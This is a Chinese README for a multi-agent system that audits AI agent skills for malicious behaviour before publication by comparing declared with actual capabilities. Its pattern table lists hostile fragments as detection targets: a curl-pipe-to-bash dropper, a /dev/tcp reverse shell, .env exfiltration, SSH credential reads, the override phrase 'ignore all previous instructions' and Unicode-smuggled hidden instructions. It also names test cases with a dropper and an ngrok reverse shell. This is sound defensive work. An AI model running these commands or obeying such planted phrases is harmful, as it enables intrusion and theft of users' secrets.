# MAS4MalSkillAudit — BIV 恶意 Skill 审计系统

> **BIV (Behavioral Integrity Verification)** 多智能体系统，对未知 AI Agent Skill 进行上架前安全审计。
>
> 输入一个 Skill 目录，输出 `benign`（良性，可上架）或 `malware`（恶意，拒绝上架）的判定及完整证据链。
>
> 严格复现论文 *Behavioral Integrity Verification for AI Agent Skills* (Yuhao Wu et al., 2025, arXiv:2605.11770)。

---

## 一、项目简介

对 AI Agent Skill（如 Claude Code Skills）进行发布前的自动化安全审计。Skill 可能携带隐藏的恶意代码，伪装成正常功能。本系统通过**声明能力与实际能力的偏差检测**来识别恶意行为。

**核心假设**：一个 Skill 是恶意的，当且仅当它**违背了用户意愿**（声明与实际能力不匹配）**且很可能造成负面影响**（存在高风险未声明能力）。

### 支持的恶意模式

| 模式 | 示例 | 检测方式 |
|------|------|---------|
| Dropper 下载执行 | `curl url \| bash` | AST 污点流 + Regex |
| 反向 Shell | `bash -i >& /dev/tcp/x:4444` | tree-sitter-bash + Regex |
| 数据外泄 | 读 `.env` → `requests.post` | AST 污点流 + Compound flag |
| 指令劫持 | `ignore all previous instructions` | Regex + LLM 指令分析 |
| 指令隐藏 | 零宽字符 / Unicode Tag 走私 | Regex 混淆检测 |
| 静默执行 | test 文件自动发现 / npm hooks | 结构攻击检测 |
| 凭证窃取 | 读 `~/.ssh`, `os.environ` 密钥 | Regex + LLM |

---

## 二、环境配置

### 2.1 系统要求

| 依赖 | 版本要求 | 用途 |
|------|---------|------|
| Python | ≥ 3.9 | 确定性流水线 (核心) |
| Node.js | ≥ 18 | npm scripts / Workflow |
| Claude Code CLI | 最新 | LLM 调用 (Agent 工具) |

### 2.2 Python 依赖

```bash
# 核心依赖
pip install pyyaml        # YAML frontmatter 解析

# 多语言 AST 解析 (污点分析)
pip install tree-sitter
pip install tree-sitter-javascript
pip install tree-sitter-typescript
pip install tree-sitter-bash
```

验证安装：

```bash
python -c "import yaml; print('pyyaml OK')"
python -c "from tree_sitter import Parser; print('tree-sitter OK')"
python -c "import tree_sitter_javascript; print('JS OK')"
python -c "import tree_sitter_bash; print('Bash OK')"
```

### 2.3 项目结构

```
MAS4MalSkill/
├── package.json              # npm scripts
├── README.md                 # 本文档
├── docs/
│   ├── skill-scanner/        # 旧版 scanner 参考文档
│   └── BIV-SYSTEM-DOCS.md    # 完整系统文档 (mermaid 图)
├── src/biv/                  # BIV 核心实现
│   ├── taxonomy.py           # 7类x29能力 + 意图分类 + 规则
│   ├── trace.py              # 调试追踪
│   ├── declared_track.py     # Module 1: D(s) 声明能力提取
│   ├── actual_track/         # Module 2: A(s) 实际能力提取
│   │   ├── ast_analyzer.py   #   AST 污点分析 (Python/JS/TS/Shell)
│   │   ├── regex_engine.py   #   Regex 能力映射
│   │   └── llm_instruction.py #   LLM 指令分析
│   ├── deviation.py          # Module 3: 偏差检测 + compound flags
│   ├── root_cause.py         # Module 4: 15条规则 + LLM 分类器
│   ├── malicious_detect.py   # Module 5: Relaxed-Veto + LLM Judge
│   └── orchestrator.py       # 三阶段编排器 + CLI + build_det_evidence()
├── scripts/
│   ├── biv_audit.py          # 单 skill 审计 (--evidence 精简模式)
│   ├── batch_audit.py        # 批量确定性审计
│   ├── biv_workflow.js       # LLM 单 case 审计 (打通确定性证据)
│   └── batch_workflow.js     # LLM 批量审计 (打通确定性证据)
└── experiment/cases/         # 测试用例
```

---

## 三、输入格式

### 3.1 输入：Skill 目录

一个 Skill 目录包含 `SKILL.md` 及可选脚本文件：

```
my-skill/
├── SKILL.md                  # 必需：Skill 定义 (YAML frontmatter + Markdown body)
├── scripts/                  # 可选：辅助脚本
│   ├── tool.py
│   ├── helper.js
│   └── setup.sh
├── references/               # 可选：参考文档
│   └── how-it-works.md
└── package.json              # 可选：npm 依赖/生命周期钩子
```

### 3.2 SKILL.md 结构

```yaml
---
name: my-skill                       # 必需：skill 名称
description: "..."                    # 必需：功能描述
allowed-tools: Read, Write, Bash      # 工具权限声明
version: 1.0.0                        # 可选
author: "..."                         # 可选
license: MIT                          # 可选
---
# Skill 正文
## Instructions
...

## Examples
...
```

### 3.3 测试用例约定

`experiment/cases/` 下的每个目录作为一个测试用例：

```
experiment/cases/
└── <skill-name>/
    ├── SKILL.md
    ├── scripts/...
    └── .expected            # 可选：预期判定 (malware / benign)
```

`.expected` 文件内容为单行 `malware` 或 `benign`，用于批量测试时验证判定准确性。

---

## 四、输出格式

### 4.1 单 case 输出 (JSON)

```json
{
  "skill_name": "my-skill",
  "skill_dir": "/path/to/skill",
  "verdict": "malware",
  "confidence": 0.9,
  "verdict_source": "relaxed_veto",
  "verdict_reasoning": "检出 RCE 复合威胁链，relaxed-veto 触发...",
  "structure": {
    "has_skill_md": true,
    "has_scripts": true,
    "script_files": ["tool.py"]
  },
  "frontmatter": { "name": "my-skill", "description": "..." },
  "taxonomy": {
    "network": { "risk": "high", "capabilities": ["net-http-out", "..."] },
    "filesystem": { "risk": "medium", "capabilities": ["..."] }
  },
  "capabilities": {
    "declared": ["fs-read-project", "net-http-out"],
    "actual": ["fs-read-project", "net-http-out", "proc-exec", "fs-write"],
    "undeclared": ["proc-exec", "fs-write"],
    "overdeclared": [],
    "declared_sources": [],
    "actual_sources": []
  },
  "flows": [
    { "source": "urlopen", "source_location": "script.py:20",
      "transforms": [], "sink": "subprocess.run", "sink_location": "script.py:53" }
  ],
  "compound_flags": {
    "exfiltration_chain": false,
    "rce_chain": true,
    "code_obfuscation": false,
    "data_lineage_violation": false
  },
  "root_cause": {
    "classification": "adversarial",
    "intent_category": "C",
    "intent_leaf": "C1",
    "intent_leaf_description": "载荷投递(dropper模式)",
    "kill_chain": "download-write-execute",
    "rule_engine_match": "rule_2",
    "classifier_source": "deterministic_rule"
  },
  "findings": [
    { "id": "FINDING-001", "type": "Dangerous Code Pattern",
      "severity": "critical", "category": "Malicious Code",
      "location": "script.py:34", "description": "...", "evidence": "..." }
  ],
  "finding_counts": { "critical": 1, "high": 2, "medium": 0, "total": 3 },
  "urls": {
    "total": 2, "trusted_count": 0, "untrusted_count": 2,
    "untrusted": [ { "url": "...", "domain": "...", "location": "..." } ]
  },
  "relaxed_veto": {
    "fired": true,
    "reason": "compound_rce_chain=true AND undeclared...",
    "compound_flag": "rce_chain"
  },
  "_det_verdict": { "verdict": "malware", "confidence": 0.9, "source": "relaxed_veto" },
  "trace": { "records": [], "phases": {} },
  "trace_summary": "Trace: ...\nTotal duration: 25ms..."
}
```

### 4.2 批量输出 (JSON)

```json
{
  "summary": {
    "total_cases": 2,
    "malware": 2,
    "benign": 0,
    "errors": 0,
    "expected_matched": 2,
    "expected_mismatched": 0,
    "veto_triggered": 2,
    "rule_engine_hits": 2
  },
  "total_duration_ms": 44,
  "results": [ { "case": "...", "verdict": "malware", "confidence": 0.9, "..." } ]
}
```

---

## 五、使用方法

### 5.1 单 skill 审计 (确定性，无 LLM)

```bash
# 完整确定性结果 (phases + trace + LLM prompts)
python scripts/biv_audit.py <skill-directory>

# 输出 JSON 到文件
python scripts/biv_audit.py <skill-directory> --output result.json

# 精简 Phi(s) 证据 (供 LLM Workflow 消费)
python scripts/biv_audit.py <skill-directory> --evidence

# 或通过 npm
npm run audit:jeremy
```

`--evidence` 模式输出紧凑的确定性结论（D/U/O、compound_flags、rule_engine、relaxed_veto、_det_verdict），是 Workflow 脚本调用 Python 管线的接口。

### 5.2 批量审计 (确定性)

```bash
# 终端汇总表
npm run batch

# JSON 到文件
npm run batch:json

# 或直接
python scripts/batch_audit.py --verbose
```

### 5.3 完整含 LLM 审计 (Claude Code)

LLM 调用必须运行在 Claude Code 运行时内。Workflow 脚本通过**子代理调用 Python 确定性管线**获取 `Phi(s)` 精简证据，再注入 LLM Judge：

```
# 单 case
Workflow({scriptPath: "scripts/biv_workflow.js", args: {skill_dir: "..."}})

# 批量
Workflow({scriptPath: "scripts/batch_workflow.js"})
```

**每个 case 的 LLM 调用链**：

```
Workflow JS (编排器)
  ├─ 子代理 → python scripts/biv_audit.py <case> --evidence
  │           → 返回 Phi(s) 精简证据 (D/U/O + compound_flags
  │             + rule_engine + relaxed_veto + _det_verdict)
  ├─ 子代理 → D_llm 语义声明能力提取 (并行)
  ├─ 子代理 → A_llm_instr 指令隐藏能力检测 (并行)
  └─ 子代理 → LLM Judge (CoT + xhigh)
              ├─ 输入: Phi(s) 证据 + LLM 提取结果 + 原始内容
              └─ 输出: verdict + confidence + reasoning
```

Judge 的 prompt 明确要求"**Weigh deterministic evidence heavily**"——compound flags（rce_chain 恶意先验 86%）、未声明高风险能力、规则引擎结论是强信号。

### 5.4 冒烟测试

```bash
npm run test:smoke
# PASS: jeremy
# PASS: ai-wrapper
```

---

## 六、技术架构

### 6.1 三阶段流水线

```mermaid
flowchart LR
    subgraph P1["Phase 1: 能力提取"]
        A1["D(s) 声明能力"]
        A2["A(s) 实际能力 + flow(s)"]
    end
    subgraph P2["Phase 2: 偏差检测"]
        B1["U = A - D 未声明"]
        B2["O = D - A 过度声明"]
        B3["4 个 compound flags"]
    end
    subgraph P3["Phase 3: 判定"]
        C1["15条规则引擎"]
        C2["Relaxed-Veto"]
        C3["LLM Judge"]
        C4["最终判定"]
    end
    P1 --> P2 --> P3
```

### 6.2 能力分类体系 (Taxonomy)

| 类别 | 能力数 | 风险等级 | 代码 |
|------|:------:|---------|------|
| Network 网络 | 4 | HIGH | `net-*` |
| Filesystem 文件系统 | 7 | MEDIUM | `fs-*` |
| Process 进程执行 | 4 | HIGH | `proc-*` |
| Environment 环境变量 | 3 | HIGH | `env-*` |
| Encoding 编码 | 3 | MEDIUM | `enc-*` |
| Credential 凭证 | 3 | CRITICAL | `cred-*` |
| Instruction 指令级 | 5 | CRITICAL | `instr-*` |

### 6.3 支持的脚本语言

| 语言 | 解析技术 | 追踪深度 |
|------|---------|---------|
| Python | `ast` 标准库 | 跨函数污点流 (inter-procedural) |
| JavaScript / TS | `tree-sitter` | 变量级 + 模板字符串 |
| Shell | `tree-sitter-bash` | pipeline 流检测 + 反向 shell |

---

## 七、故障排查

| 问题 | 解决方案 |
|------|---------|
| `tree-sitter` 导入失败 | `pip install tree-sitter` 及对应语言包 |
| `yaml` 未安装 | `pip install pyyaml` |
| 中文乱码 | Python 3.9+ 输出 UTF-8；CLI 已内置 `reconfigure` |
| Windows 控制台 GBK 错误 | 已内置 `sys.stdout.buffer.write()` 绕过 |
| LLM 调用无法执行 | LLM 调用必须在 Claude Code 运行时内 (Workflow 脚本) |
| 审计结果有误 | 查看 `trace` 字段逐步调试，或 `--verbose` 查看中间数据 |

---

## 八、验证结果

| 用例 | 类型 | 技术 | 判定 | 正确 |
|------|------|------|------|:----:|
| 000-jeremy | Python dropper | 下载→执行恶意二进制 | malware (0.90) | ✓ |
| ai-wrapper-product | JS 反向 Shell | ngrok C2 + socket 管道 | malware (0.90) | ✓ |

---

## 九、论文对照

| 论文组件 | 本实现 | 状态 |
|---------|--------|:----:|
| 7×29 能力 Taxonomy | `taxonomy.py` | ✓ |
| 8×36 意图分类 | `taxonomy.py` | ✓ |
| 15 条确定性规则 | `root_cause.py` | ✓ |
| 10 种 Kill-Chain | `taxonomy.py` | ✓ |
| 4 个 Compound Flag | `deviation.py` | ✓ |
| Relaxed-Veto 公式 | `malicious_detect.py` | ✓ |
| 污点流分析 | `ast_analyzer.py` | ✓ (超论文: JS/TS/Shell) |
| 3 重幻觉控制 | `declared_track.py` | ✓ |
